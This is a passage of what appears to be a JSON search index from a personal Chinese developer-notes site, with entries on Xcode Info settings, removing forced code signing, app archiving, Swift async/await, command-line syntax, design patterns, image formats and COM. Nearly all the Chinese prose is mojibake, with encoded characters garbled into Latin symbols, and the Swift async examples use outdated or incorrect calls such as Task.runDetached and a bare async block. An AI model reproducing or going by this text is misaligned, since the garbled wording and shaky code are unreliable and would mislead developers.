è²Œä¼¼æ ¹æœ¬æ²¡å‘åœ¨é¡¹ç›®æ”¯æŒ.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-Use-moduleMap-to-import-the-C-++-framework.html","loc":"/yq-doc-source-docs-rear-end-swift-Use-moduleMap-to-import-the-C-++-framework.html"},{"title":"Xcodeçš„Infoé…ç½®","text":"é…ç½®ä½ç½® è¿™é‡Œé…ç½®æ—¶, ä¼šè‡ªåŠ¨æ–°å»ºä¸€ä¸ªinfo.plistæ–‡ä»¶. è‹¥è¿™é‡Œæ²¡æœ‰ç›¸åº”çš„é€‰é¡¹, é‚£ä¹ˆå¯ç‚¹å‡»ä»»æ„æ¡ç›®çš„ + è¿›è¡Œæ–°å¢, å¦‚å›¾: ä¸‹é¢ä»‹ç»å¸¸è§æ¡ç›®ä½œç”¨ Application is agent (UIElement): boolean ç”¨æ¥å°†åº”ç”¨ç¨‹åºè®¾ç½®ä¸ºä»£ç†ï¼ˆagentï¼‰åº”ç”¨ç¨‹åºã€‚ åº”ç”¨ç¨‹åºå°†ä»¥æ— çª—å£çš„å½¢å¼è¿è¡Œï¼Œå¹¶ä¸”ä¸ä¼šåœ¨ Dock ä¸­æ˜¾ç¤ºåº”ç”¨ç¨‹åºå›¾æ ‡ã€‚ é€šå¸¸ç”¨äºå®ç°åå°ä»»åŠ¡ã€ç³»ç»Ÿçº§åˆ«çš„æœåŠ¡æˆ–èœå•æ åº”ç”¨ç¨‹åºç­‰ã€‚ ä»£ç†åº”ç”¨ç¨‹åºåœ¨åå°è¿è¡Œï¼Œä¸ä¼šå¹²æ‰°ç”¨æˆ·çš„å·¥ä½œæµç¨‹ï¼Œä½†ä»ç„¶å¯ä»¥æä¾›æŸäº›åŠŸèƒ½æˆ–æœåŠ¡ã€‚ éšè—åº”ç”¨ç¨‹åºå›¾æ ‡ï¼šè®¾ç½®åº”ç”¨ç¨‹åºä¸ºä»£ç†åº”ç”¨ç¨‹åºåï¼Œåº”ç”¨ç¨‹åºçš„å›¾æ ‡å°†ä¸ä¼šæ˜¾ç¤ºåœ¨ Dock ä¸­ï¼Œä»è€Œä¸ä¼šå ç”¨ Dock çš„ç©ºé—´ æ— çª—å£è¿è¡Œï¼šä»£ç†åº”ç”¨ç¨‹åºé€šå¸¸ä¸éœ€è¦æ˜¾ç¤ºçª—å£ï¼Œå› æ­¤å®ƒä»¬ä»¥æ— çª—å£çš„å½¢å¼è¿è¡Œï¼Œä¸ä¼šåœ¨å±å¹•ä¸Šæ˜¾ç¤ºç”¨æˆ·ç•Œé¢ã€‚ åå°ä»»åŠ¡ï¼šä»£ç†åº”ç”¨ç¨‹åºå¯ä»¥åœ¨åå°æ‰§è¡Œä»»åŠ¡ï¼Œä¾‹å¦‚ç›‘æ§ç³»ç»Ÿäº‹ä»¶ã€å®šæ—¶ä»»åŠ¡ã€ç½‘ç»œè¯·æ±‚ç­‰ã€‚ ç³»ç»Ÿçº§åˆ«çš„æœåŠ¡ï¼šä»£ç†åº”ç”¨ç¨‹åºå¯ä»¥æä¾›ç³»ç»Ÿçº§åˆ«çš„æœåŠ¡ï¼Œä¾‹å¦‚å…¨å±€å¿«æ·é”®ç›‘å¬ã€å‰ªè´´æ¿æ“ä½œã€èœå•æ æ‰©å±•ç­‰ã€‚ é¢å¤–ä½œç”¨: çª—å£é»˜è®¤æ”¯æŒ æ˜¾ç¤ºåœ¨å…¶ä»–å…¨å±åº”ç”¨ä¸Šæ–¹ (å¯èƒ½æ˜¯å› ä¸ºå±äºç³»ç»Ÿçº§)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-Xcode's-Info-configuration.html","loc":"/yq-doc-source-docs-rear-end-swift-Xcode's-Info-configuration.html"},{"title":"Xcodeåˆ é™¤æ‰å¼ºåˆ¶è¯ä¹¦","text":"Xcodeåˆ é™¤æ‰å¼ºåˆ¶è¯ä¹¦/åˆ é™¤æ‰å¼ºåˆ¶å›¢é˜ŸéªŒè¯ å…ˆå…³é—­æ‰xcodeé¡¹ç›®, ç„¶åç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ¯”å¦‚vscodeæ‰“å¼€ é¡¹ç›®é…ç½®æ–‡ä»¶ xxx.xcodeproj , å…¨å±€æœç´¢å¹¶æ›´æ–°ä¸ºä»¥ä¸‹å­—æ®µ: # è¿™ä¸ªè¿™æ ·æ”¹ CODE_SIGN_STYLE = Manual; # è¿™äº›ç›´æ¥åˆ é™¤ä¹Ÿå¯ CODE_SIGN_IDENTITY = \"\" DEVELOPMENT_TEAM = \"\" PROVISIONING_PROFILE_SPECIFIER = \"\"; åŸæ¥çš„å†…å®¹ä¹Ÿè´´ä¸€ä¸‹åšä¸ªå‚è€ƒ: CODE_SIGN_STYLE = Automatic; # æœ€ä¸»è¦å°±æ˜¯è¿™ä¸ªå’ŒTEAM CODE_SIGN_IDENTITY = \"Apple Development\"; DEVELOPMENT_TEAM = \"\"; PROVISIONING_PROFILE_SPECIFIER = \"\"; æ³¨è§£ ä¸è¦åœ¨xcodeé¡¹ç›®æ‰“å¼€çš„æ—¶å€™æ”¹, ä¸ç„¶ä¼šä¿®æ”¹å¤±è´¥(å¤šåŠä¼šè¢«å†…å­˜ä¸­çš„è¦†ç›–æ‰) é‡æ–°æ‰“å¼€xcode, åœ¨ Target ä¸­çœ‹çœ‹å¯¹ä¸å¯¹, ä¸å¯¹å°±æŒ‰è¿™æ ·é€‰æ‹© ä»¥åŠåœ¨ build setting ä¸­çš„ Signing è®¾ç½®ä¸‹ æ³¨è§£ é¡ºä¾¿åæ§½ä¸€å¥, xcode å¤ªéš¾ç”¨","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-Xcode-delete-the-compulsory-certificate.html","loc":"/yq-doc-source-docs-rear-end-swift-Xcode-delete-the-compulsory-certificate.html"},{"title":"Xcode-åˆ†å‘æ‰“åŒ…","text":"Xcodeç‰ˆæœ¬: 15.1(15C65) å½“å‰ç‰ˆæœ¬ åœ¨æ­¤ä½ç½®ç¼–è¾‘Schema æˆ–è€…åœ¨ Product - Schema ç¼–è¾‘Schema Product - Archive è¿›è¡Œæ‰“åŒ… æ‰“åŒ…ä½ç½® ç„¶åä¼šè¿›å…¥ Archive ç•Œé¢, é€‰æ‹© Distribute App æ³¨æ„, Archive ç•Œé¢ä¹Ÿå¯ä»¥é€šè¿‡ Window - Organizer è¿›å…¥: æ²¡è´­ä¹°å®˜æ–¹å¼€å‘è€…è´¦å·çš„å°±é€‰ Custom æ¥å¯¼å‡ºå‰¯æœ¬åˆ°æœ¬åœ° æ­£è§„Appå¼€å‘è€…è´¦å·ä¸Šä¼ åç»­å¯ä»¥å‚è€ƒ: https://zhuanlan.zhihu.com/p/583812511","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-Xcode-distribution-packaging.html","loc":"/yq-doc-source-docs-rear-end-swift-Xcode-distribution-packaging.html"},{"title":"xcode15æ–°åŠŸèƒ½","text":"é¢„è§ˆå®-Preview æ–°ç‰ˆæœ¬å¦‚æœè¦é¢„è§ˆ swiftUI, ç›´æ¥: #Preview { ContentView() } å³å¯ å‚è€ƒ: https://juejin.cn/post/7244109491897401381","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-Xcode15-new-features.html","loc":"/yq-doc-source-docs-rear-end-swift-Xcode15-new-features.html"},{"title":"Swiftå¼‚æ­¥","text":"äºPythonç±»ä¼¼, é«˜ç‰ˆæœ¬ä¹Ÿæ”¯æŒä½¿ç”¨async(await)æ¥å®šä¹‰(è°ƒç”¨)å¼‚æ­¥å‡½æ•°: func fetchData() async -> String { // æ¨¡æ‹Ÿå¼‚æ­¥æ“ä½œï¼Œæ¯”å¦‚ä»ç½‘ç»œè·å–æ•°æ® await Task.sleep(1_000_000_000) // æ¨¡æ‹Ÿ1ç§’çš„å»¶è¿Ÿ return \"Data fetched successfully\" } å½“åœ¨å¼‚æ­¥ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨æ—¶, é™¤äº†ç›´æ¥await, è¿˜å¯ä»¥: async { print(\"Async code block\") let result = try await someAsyncFunction() print(\"Result: \\(result)\") } å¦‚æœè¦åœ¨åŒæ­¥ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨, å¯ä»¥ä½¿ç”¨ Task æˆ–è€… Task.runDetached : Task.runDetached { print(\"Before calling asyncTask\") await asyncTask() print(\"After calling asyncTask\") } Task { print(\"Before calling asyncTask\") await asyncTask() print(\"After calling asyncTask\") } ä¸¤è€…åŒºåˆ«åœ¨äºå®ƒä»¬çš„ä»»åŠ¡åˆ†ç¦»æ€§å’Œè¿è¡Œæ–¹å¼ ä»»åŠ¡åˆ†ç¦»æ€§ï¼š Task.runDetached: åˆ›å»ºä¸€ä¸ªåˆ†ç¦»çš„ä»»åŠ¡ï¼Œè¯¥ä»»åŠ¡ä¸ä¼šç­‰å¾…å…¶å®Œæˆï¼Œ å®ƒä¼šåœ¨åå°æ‰§è¡Œï¼Œä¸ä¼šé˜»å¡å½“å‰çº¿ç¨‹ã€‚ è¿™æ„å‘³ç€ä¸»çº¿ç¨‹æˆ–å½“å‰ä¸Šä¸‹æ–‡ä¸­çš„ä»£ç å¯ä»¥ç»§ç»­æ‰§è¡Œè€Œä¸ç­‰å¾…ä»»åŠ¡å®Œæˆã€‚ Task: åœ¨å½“å‰ä¸Šä¸‹æ–‡ä¸­åˆ›å»ºä¸€ä¸ªä»»åŠ¡ï¼Œå®ƒçš„è¡Œä¸ºç±»ä¼¼äºä¸€ä¸ªå­ä»»åŠ¡ã€‚ å¦‚æœä½ åœ¨ä¸€ä¸ªä»»åŠ¡ä¸­è°ƒç”¨å¦ä¸€ä¸ªä»»åŠ¡ï¼Œå¹¶ä½¿ç”¨ await æ¥ç­‰å¾…å®ƒçš„å®Œæˆï¼Œ é‚£ä¹ˆå®ƒä¼šåœ¨å½“å‰ä»»åŠ¡ä¸­è¢«ç­‰å¾…ï¼Œä¸ä¼šåˆ†ç¦»æ‰§è¡Œ è¿è¡Œæ–¹å¼ï¼š Task.runDetached: ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ä»»åŠ¡ï¼Œå¹¶åœ¨åå°è¿è¡Œï¼Œä¸å½±å“å½“å‰ä»»åŠ¡çš„æ‰§è¡Œã€‚ è¿™é€šå¸¸ç”¨äºå¯åŠ¨ä¸€ä¸ªå¼‚æ­¥ä»»åŠ¡ï¼Œè€Œä¸éœ€è¦ç­‰å¾…å®ƒå®Œæˆ Task: åœ¨å½“å‰ä»»åŠ¡ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¦‚æœä½¿ç”¨ await ç­‰å¾…å…¶å®Œæˆï¼Œ å®ƒä¼šè¢«ç­‰å¾…æ‰§è¡Œå®Œæˆåå†ç»§ç»­å½“å‰ä»»åŠ¡çš„æ‰§è¡Œ","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-swift-asynchronous.html","loc":"/yq-doc-source-docs-rear-end-swift-asynchronous.html"},{"title":"å‘½ä»¤è¡Œå‚æ•°é€‰é¡¹ç»“æ„(å‘½ä»¤è¡Œå¸®åŠ©æ–‡æ¡£è¯­æ³•æ ¼å¼è¯¦è§£)","text":"æ–¹æ‹¬å· [] æ–¹æ‹¬å·å†…çš„å€¼æ˜¯å¯é€‰çš„. å¯ä»¥ä¸€ä¸ªæ‹¬å·å†…å¤šä¸ªå€¼(ä»¥ç©ºæ ¼åˆ†å‰²), ä¹Ÿå¯ä»¥å¤šä¸ªå€¼éƒ½ç”¨æ‹¬å·åŒ…è£¹, ä¸¤è€…æ˜¯ç­‰ä»·çš„ å°–æ‹¬å· <> è¡¨ç¤ºæ‹¬å·å†…çš„å€¼æ˜¯å¿…é¡»çš„, å€¼éœ€è¦è¢«å…·ä½“çš„å€¼æ›¿æ¢ ç®¡é“ | å¤šä¸ªå‚æ•°å¯ç”±ç®¡é“ç¬¦éš”å¼€, è¡¨ç¤ºä»»é€‰å…¶ä¸€, è¡¨ç¤ºäº’æ–¥ èº«ç•¥å· ... ç­‰, è¡¨ç¤ºå‰ä¸€ä¸ªå€¼å¯é‡å¤ å¤§æ‹¬å· {} æˆ– åœ†æ‹¬å· () å¿…é¡», æ‹¬å·å†…çš„å€¼å¸¸ç”¨ç®¡é“ç¬¦åˆ†å‰², ä»»é€‰å…¶ä¸€å³å¯ ä¹¦å†™è§„èŒƒ éæ‹¬å·é»˜è®¤å‚æ•°éƒ½æ˜¯å¿…é€‰ çŸ­é€‰é¡¹å¯ä»¥å †å : -a -b -c # ç­‰ä»·ä¸ -abc çŸ­é€‰é¡¹çš„å‚æ•°å¯é€‰ç©ºæ ¼: -a File # ç­‰ä»·ä¸ -aFile é•¿é€‰é¡¹çš„å‚æ•°å¯ç”¨ç©ºæ ¼æˆ–è€…ç­‰äºç¬¦å·åˆ†å‰²: --input <arg> # ç­‰ä»·ä¸ --input=<arg> åŒä¸€ä¸ªç”¨é€”é€‰é¡¹ä¸€èˆ¬é€‚ç”¨é€—å·éš”å¼€: -h, --help è‹¥éœ€æŒ‡å®šä¸€ä¸ªé€‰é¡¹å¸¦æœ‰ä¸€ä¸ªå‚æ•°ï¼Œåˆ™éœ€ åœ¨ç©ºæ ¼æˆ–ç­‰å·=åæ”¾ä¸€ä¸ªæè¿°è¯¥å‚æ•°çš„è¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ é€‰é¡¹å‚æ•°éµå¾ªå°–æ‹¬å·<argument>æˆ–å…¨å¤§å†™ARGUMENTçš„çº¦å®šã€‚ å¦‚æœæœ‰å¿…è¦ï¼Œå¯ä»¥ä½¿ç”¨é€—å·,åˆ†éš”é€‰é¡¹ã€‚ å…¶ä»– ç”¨ï¼ˆè‡³å°‘ï¼‰ä¸¤ä¸ªç©ºæ ¼æ¥åˆ†éš”é€‰é¡¹å’Œå®ƒä»¬çš„éæ­£å¼æè¿°ã€å¦‚æœåªç”¨ä¸€ä¸ªç©ºæ ¼ï¼Œå¯èƒ½ä¼šå°†æè¿°çš„é¦–ä¸ªè¯å½“åšé€‰é¡¹çš„å‚æ•°ã€‘ å¦‚æœè¦ä¸ºå¸¦æœ‰å‚æ•°çš„é€‰é¡¹è®¾ç½®é»˜è®¤å€¼ï¼Œåˆ™ä½¿ç”¨ [default: the-default-value] çš„å½¢å¼å°†å…¶æ”¾åˆ°é€‰é¡¹æè¿°ä¸­ ä¸€èˆ¬å¸¸é€‰é¡¹å‚æ•°è·Ÿç­‰å·, çŸ­é€‰é¡¹å‚æ•°ä¸è·Ÿç­‰å·: --maxfail=<num> , -m<file> å‚è€ƒ:: å‘½ä»¤è¡Œå¸®åŠ©æ–‡æ¡£è¯­æ³•æ ¼å¼è¯¦è§£","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-Command-line-parameter-option-structure.html","loc":"/yq-doc-source-docs-Chaotic-Command-line-parameter-option-structure.html"},{"title":"è®¾è®¡æ¨¡å¼","text":"é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ï¼ˆObject-Oriented Programmingï¼‰æ˜¯ä¸€ç§èŒƒå¼ åŸºæœ¬ç†å¿µæ˜¯å°†æ•°æ®å—ä¸æ•°æ®ç›¸å…³çš„è¡Œä¸ºå°è£…æˆç‰¹æ®Šçš„ã€åä¸ºå¯¹è±¡çš„å®ä½“ï¼ŒåŒæ—¶å¯¹è±¡å®ä½“çš„ç”Ÿæˆå·¥ä½œåˆ™æ˜¯åŸºäºç¨‹åºå‘˜ç»™å‡ºçš„ä¸€ç³»åˆ—\"è“å›¾\"ï¼Œè¿™äº›\"è“å›¾\"å°±æ˜¯ç±»ã€‚ ç±»ï¼šå®šä¹‰å¯¹è±¡ç»“æ„çš„\"è“å›¾\" å¯¹è±¡ï¼šç±»çš„å…·ä½“å®ä¾‹ è½¯ä»¶è®¾è®¡åŸåˆ™ ç‰¹å¾ ä»£ç å¤ç”¨ æ‹“å±•æ€§ è®¾è®¡åŸåˆ™ åˆ›å»ºå‹æ¨¡å¼ å·¥å‚æ–¹æ³• æŠ½è±¡å·¥å‚ ç”Ÿæˆå™¨ åŸå‹ å•ä¾‹ å·¥å‚æ–¹æ³•è¯´æ˜ åœ¨çˆ¶ç±»æä¾›ä¸€ä¸ªåˆ›å»ºå¯¹è±¡çš„æ–¹æ³•ï¼Œå…è®¸å­ç±»å†³å®šå®ä¾‹åŒ–å¯¹è±¡çš„ç±»å‹ ç»“æ„ï¼š ä¸¤ä¸ªç±»ï¼Œä¸€ä¸ªäº§å“ç±»ï¼Œä¸€ä¸ªåˆ›å»ºè€…ç±» äº§å“ å£°æ˜æ¥å£ å…·ä½“äº§å“ æ¥å£çš„ä¸åŒå®ç° åˆ›å»ºè€… å£°æ˜è¿”å›äº§å“å¯¹è±¡çš„å·¥å‚æ–¹æ³• å…·ä½“åˆ›å»ºè€… å®ç° ä¸ºäº†å®ç° é«˜å†…èšï¼Œä½è€¦åˆ å•ä¸€èŒè´£ å¼€é—­åŸåˆ™ æ³¨è§£ ç®€å•å·¥å‚ ==ã€‹ å·¥å‚æ–¹æ³• ==ã€‹ æŠ½è±¡å·¥å‚ ç®€å•å·¥å‚ ç®€å•å·¥å‚ä¸ç®—æ˜¯ä¸€ä¸ªçœŸæ­£çš„è®¾è®¡æ¨¡å¼ï¼Œè€Œæ›´åƒæ˜¯ä¸€ç§æˆ‘ä»¬çš„ç¼–ç¨‹ä¹ æƒ¯ï¼Œ ä½†æ˜¯åœ¨å¹³æ—¶ç¼–ç ä¸­è¿™ä¸å¤±ä¸ºä¸€ä¸ªç®€å•çš„æ–¹æ³•ï¼Œå¯ä»¥å°†å®¢æˆ·ç¨‹åºä»å…·ä½“ç±»è§£è€¦ã€‚ å·¥å‚ç±»æ‹¥æœ‰ä¸€ä¸ª å·¥å‚-æ–¹æ³• , æ¥å—äº†ä¸€ä¸ªå‚æ•°ï¼Œé€šè¿‡ä¸åŒçš„å‚æ•°å®ä¾‹åŒ–ä¸åŒçš„äº§å“ç±»ã€‚ ä½¿ç”¨ä¸€ä¸ªå·¥å‚å¯¹è±¡ç”¨æ¥ç”Ÿäº§åŒä¸€ç­‰çº§ç»“æ„ä¸­çš„ä»»æ„äº§å“ã€‚ï¼ˆä¸æ”¯æŒæ‹“å±•å¢åŠ äº§å“ï¼‰ å·¥å‚æ–¹æ³• å®šä¹‰äº†ä¸€ä¸ªåˆ›å»ºå¯¹è±¡çš„æ¥å£ï¼Œä½†ç”±å­ç±»å†³å®šè¦å®ä¾‹åŒ–çš„ç±»æ˜¯å“ªä¸€ä¸ªã€‚å·¥å‚æ–¹æ³•è®©ç±»çš„å®ä¾‹åŒ–æ¨è¿Ÿåˆ°å­ç±»ã€‚ ä½¿ç”¨å¤šä¸ªå·¥å‚å¯¹è±¡ç”¨æ¥ç”Ÿäº§åŒä¸€ç­‰çº§ç»“æ„ä¸­å¯¹åº”çš„å›ºå®šäº§å“ã€‚ï¼ˆæ”¯æŒæ‹“å±•å¢åŠ äº§å“ï¼‰ æŠ½è±¡å·¥å‚æ¨¡å¼ æä¾›ä¸€ä¸ªæ¥å£ï¼Œç”¨äºåˆ›å»ºç›¸å…³æˆ–ä¾èµ–å¯¹è±¡çš„å®¶æ—ï¼Œè€Œä¸éœ€è¦æ˜ç¡®æŒ‡å®šå…·ä½“ç±»ã€‚ ä¾‹å¦‚ï¼Œæ±½è½¦å¯ä»¥åˆ†ä¸ºè½¿è½¦ã€SUVã€MPVç­‰ï¼Œä¹Ÿåˆ†ä¸ºå¥”é©°ã€å®é©¬ç­‰ã€‚ æˆ‘ä»¬å¯ä»¥å°†å¥”é©°çš„æ‰€æœ‰è½¦çœ‹ä½œæ˜¯ä¸€ä¸ªäº§å“æ—ï¼Œè€Œå°†å®é©¬çš„æ‰€æœ‰è½¦çœ‹ä½œæ˜¯å¦ä¸€ä¸ªäº§å“æ—ã€‚ åˆ†åˆ«å¯¹åº”ä¸¤ä¸ªå·¥å‚ï¼Œä¸€ä¸ªæ˜¯å¥”é©°çš„å·¥å‚ï¼Œå¦ä¸€ä¸ªæ˜¯å®é©¬çš„å·¥å‚ã€‚ ä¸å·¥å‚æ–¹æ³•ä¸åŒï¼Œå¥”é©°çš„å·¥å‚ä¸åªæ˜¯ç”Ÿäº§å…·ä½“çš„æŸä¸€ä¸ªäº§å“ï¼Œ è€Œæ˜¯ä¸€æ—äº§å“ï¼ˆ å¥”é©°è½¿è½¦ ã€å¥”é©°SUVã€å¥”é©°MPVï¼‰ã€‚ \"æŠ½è±¡å·¥å‚\"çš„\"æŠ½è±¡\"æŒ‡çš„æ˜¯å°±æ˜¯è¿™ä¸ªæ„æ€ã€‚ å³ç›¸æ¯”äºå·¥å‚æ–¹æ³•ï¼ŒæŠ½è±¡å·¥å‚å®šä¹‰äº†ä¸€ç³»åˆ—çš„äº§å“ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªäº§å“ã€‚ ä½¿ç”¨å¤šä¸ªå·¥å‚å¯¹è±¡ç”¨æ¥ç”Ÿäº§ä¸åŒäº§å“æ—çš„å…¨éƒ¨äº§å“ã€‚ï¼ˆä¸æ”¯æŒæ‹“å±•å¢åŠ äº§å“ï¼›æ”¯æŒå¢åŠ äº§å“æ—ï¼‰","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-desgin-pattern.html","loc":"/yq-doc-source-docs-Chaotic-desgin-pattern.html"},{"title":"å…³äºæœ€åä¸€è¡Œç©ºè¡Œçš„é—®é¢˜","text":"ä¸»è¦æœ‰ä¸¤ä¸ªç†ç”±ï¼š æŸäº›å·¥å…·ï¼ˆç‰¹åˆ«æ˜¯æ¯”è¾ƒå¤è€çš„ï¼‰ï¼Œå¦‚æœæ–‡ä»¶çš„æœ«å°¾æ²¡æœ‰ \\n æˆ– \\r ï¼Œå°±ä¼šå¿½ç•¥æœ€åä¸€è¡Œã€‚ æœ€åæœ‰ä¸€ä¸ªç©ºè¡Œï¼Œä¾¿äºåˆ¤æ–­è¿™ä¸ªæ–‡ä»¶ä¼ è¾“å®Œæ•´ï¼ˆè€Œä¸æ˜¯åªä¼ äº†ä¸€åŠï¼‰ ç°åœ¨æ²¡æœ‰è¿™ä¸ªé—®é¢˜ å¤§å¤šæ˜¯ä¸€ä¸ªè§„èŒƒä¹ æƒ¯","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-last-line-empty-line-problem.html","loc":"/yq-doc-source-docs-Chaotic-last-line-empty-line-problem.html"},{"title":"ä¸€äº›å¾…çœ‹åšå®¢","text":"https://yizibi.github.io/ https://www.python.org/downloads/release/python-365/ https://www.cnblogs.com/lgyxta/p/12100623.html https://blog.csdn.net/qq_43739097/article/details/104383456 https://blog.csdn.net/HBT036017/article/details/104930595 https://blog.csdn.net/weixin_31682031/article/details/113135005 https://www.cnblogs.com/linuxk/p/9371475.html ä¿®æ”¹mysqlå¯†ç ï¼š https://blog.csdn.net/scorpio_j/article/details/112557655?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.opensearchhbase&spm=1001.2101.3001.4242.1 æ²¡å•¥ç”¨ æœ€åé‡è£…è§£å†³ pythoné˜Ÿåˆ—ï¼š https://blog.csdn.net/weixin_43533825/article/details/89155648 pythonå¤šçº¿ç¨‹ï¼š https://www.runoob.com/python3/python3-multithreading.html https://blog.csdn.net/jiahao1186/article/details/90209397 https://cloud.tencent.com/developer/article/1669101 mysqlæ—¥å¿—åˆ é™¤ï¼š https://www.cnblogs.com/tv151579/p/8289204.html https://www.cnblogs.com/sandea/p/5200054.html python join https://cloud.tencent.com/developer/article/1478401 mysqlç¼–ç ï¼š https://my.oschina.net/zhoyq/blog/3169449 mysqlæŸ¥é‡ https://blog.csdn.net/haoui123/article/details/80562835 Pythonå­è¿›ç¨‹æ‰§è¡Œå®Œä½†æ˜¯ä¸ç»“æŸï¼Ÿ https://www.zhihu.com/question/63265466 winrarä¸‹è½½ï¼Œ ä¸ªäººå…è´¹ï¼Œå•†ä¸šæ”¶è´¹ https://www.rarlab.com/download.htm è®¾è®¡æ¨¡å¼ https://refactoringguru.cn/design-patterns/bridge python3ä¸‹è½½mysqlclient https://www.lfd.uci.edu/~gohlke/pythonlibs/#mysql-python","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-some-blog-unwatch.html","loc":"/yq-doc-source-docs-Chaotic-some-blog-unwatch.html"},{"title":"å›¾ç‰‡æ ¼å¼","text":"ç®€è¿° JPEG < PNG < SVG JPEG: æœ‰æŸæ ¼å¼, ä¸èƒ½ä¿å­˜é€æ˜åŒºåŸŸ PNG: æ— æŸå‹ç¼©, è¾ƒJPEGæ›´å¤§, æ”¯æŒé€æ˜åŒºåŸŸ GIF: åŠ¨å›¾, ç›®å‰å…¼å®¹æ€§æœ€å¥½ SVG: è®¾è®¡ç”¨, æ–‡ä»¶ä¿¡æ¯ä»¥ä»£ç å½¢å¼ä¿å­˜ JPEG JPEG æ ¼å¼æ˜¯ä¸€ç§æœ‰æŸçš„å›¾ç‰‡å‹ç¼©æ ¼å¼ï¼Œå®ƒç”¨ç®—æ³•å°½é‡å»é™¤å†—ä½™çš„å›¾åƒå’Œè‰²å½©æ•°æ®ï¼Œåœ¨å›¾ç‰‡æ–‡ä»¶è¾ƒå°çš„æƒ…å†µä¸‹å¯ä»¥å¾—åˆ°æ¯”è¾ƒé«˜è´¨é‡çš„å›¾ç‰‡ã€‚ PNG PNG å›¾ç‰‡æ ¼å¼é‡‡ç”¨çš„æ˜¯æ— æŸå‹ç¼©ï¼Œå’Œ JPEG ç›¸æ¯”æ–‡ä»¶çš„ä½“ç§¯æ˜¯ä¼šå¤§ä¸€äº›çš„ï¼Œä½†æ˜¯å›¾ç‰‡è´¨é‡éå¸¸å¥½ï¼Œè€Œä¸”è¿˜æ”¯æŒ Alpha é€šé“ï¼Œä¹Ÿå°±æ˜¯è¯´ PNG å¯ä»¥å­˜éƒ¨åˆ†åŒºåŸŸé€æ˜çš„å›¾ç‰‡ã€‚ GIF GIF çš„ç‰¹ç‚¹å°±æ˜¯å®ƒå¯ä»¥æ˜¯åŠ¨å›¾ï¼Œè€Œä¸”æ”¯æŒå›¾ç‰‡çš„é€æ˜ï¼Œä½†æ˜¯å‡ºäºä½“ç§¯çš„è€ƒè™‘ GIF åªæ”¯æŒ 256 è‰²ï¼Œæ¸…æ™°åº¦å’Œè‰²å½©è´¨é‡å¹¶ä¸æ˜¯å¾ˆå¥½ã€‚ SVG SVG, å¯ç¼©æ”¾çŸ¢é‡å›¾å½¢(Scalable Vector Graphics)ã€‚SVG æ ¼å¼æŠŠå›¾åƒä¿¡æ¯ç”¨ä»£ç çš„å½¢å¼å­˜è¿›äº†æ–‡ä»¶ä¸­ï¼Œä½ å¯ä»¥é€šè¿‡ä»»ä½•ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘è½¯ä»¶ï¼ˆè®°äº‹æœ¬ã€VS Codeç­‰ï¼‰æ‰“å¼€æ¥æŸ¥çœ‹æºä»£ç ï¼Œæ‰€ä»¥å®ƒä¸ä½†ä½“ç§¯å°è€Œä¸”æ‰©å±•æ€§å¾ˆå¼ºï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç¼–ç¨‹çš„æ–¹å¼æ§åˆ¶ SVG å›¾ç‰‡è¿›è¡Œäº¤äº’å’ŒåŠ¨ç”»çš„æ’­æ”¾ã€‚ æ€ä¹ˆé€‰æ‹©å›¾ç‰‡æ ¼å¼ ç…§ç‰‡ç”¨ JPEGï¼Œå› ä¸ºè‰²å½©æ¯”è¾ƒä¸°å¯Œä¹Ÿä¸éœ€è¦é€æ˜ï¼Œç”¨ JPEG å³æœ‰è¾ƒé«˜çš„å›¾åƒè´¨é‡è¿˜èƒ½ä¿æŒè¾ƒå°çš„æ–‡ä»¶ä½“ç§¯ã€‚ å°å›¾ç‰‡ï¼Œå°å›¾æ ‡ï¼Œæœ‰é€æ˜éœ€æ±‚çš„ç”¨ PNGï¼Œå°ºå¯¸è¾ƒå¤§çš„ç…§ç‰‡å¦‚æœç”¨ PNG æ–‡ä»¶ä½“ç§¯ä¼šæ¯” JPEG å¤§ä¸å°‘ã€‚ åŠ¨å›¾ç”¨ GIFï¼Œè™½ç„¶ç°åœ¨æœ‰æ›´å¥½çš„åŠ¨å›¾æŠ€æœ¯æ ¼å¼ï¼Œä½†æ˜¯ GIF æ˜¯å…¼å®¹æ€§æœ€å¥½çš„ï¼ŒåŸºæœ¬ä¸Šæ‰€æœ‰çš„è®¾å¤‡å’Œå¹³å°éƒ½æ”¯æŒçš„å¾ˆå¥½ã€‚ å‚è€ƒ:: https://zhuanlan.zhihu.com/p/134173186","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-Image-Format.html","loc":"/yq-doc-source-docs-Chaotic-Image-Format.html"},{"title":"COMæœºåˆ¶","text":"COM(ç»„ä»¶å¯¹è±¡æ¨¡å‹), ç”±å¾®è½¯æå‡º, æ˜¯å…³äºå¦‚ä½•å»ºç«‹ç»„ä»¶ä»¥åŠå¦‚ä½•é€šè¿‡ç»„ä»¶å»ºæ„åº”ç”¨ç¨‹åºçš„ä¸€ä¸ªè§„èŒƒ. åˆ°2023çš„ç°åœ¨, æŠ€æœ¯å¯ä»¥è¯´æ˜¯è¿‡æ—¶äº†, æ€æƒ³å€¼å¾—å­¦ä¹ . å¯¹ç»„ä»¶çš„éœ€æ±‚: åŠ¨æ€é“¾æ¥ éšè—å†…éƒ¨å®ç° å‚è€ƒ: COMæŠ€æœ¯å†…å¹• || è¿™æ 